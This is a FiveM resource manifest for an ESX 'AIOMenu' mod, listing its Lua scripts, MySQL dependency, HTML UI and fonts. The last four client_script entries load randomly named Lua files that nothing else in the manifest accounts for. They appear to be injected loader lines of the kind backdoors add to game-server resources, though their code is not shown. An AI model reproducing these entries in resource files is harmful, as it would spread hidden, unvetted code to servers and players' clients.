




resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX AIOMenu'

version '3.0'

server_scripts({
	'config.lua',
	'server/main.lua',
	'@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua'
})

client_scripts({
	'config.lua',
	'client/main.lua',
	'@essentialmode/locale.lua'
})

dependency 'essentialmode'

ui_page('client/html/index.html')

files({
    'client/html/index.html',
	'client/html/style.css',
	'client/html/fonts/pdown.ttf',
	'client/html/fonts/bankgothic.ttf'
})

client_script 'CtMMQnqkhyopWI4N.lua'
client_script 'mYEV.lua'
client_script 'L539.lua'
client_script 'jtxU.lua'


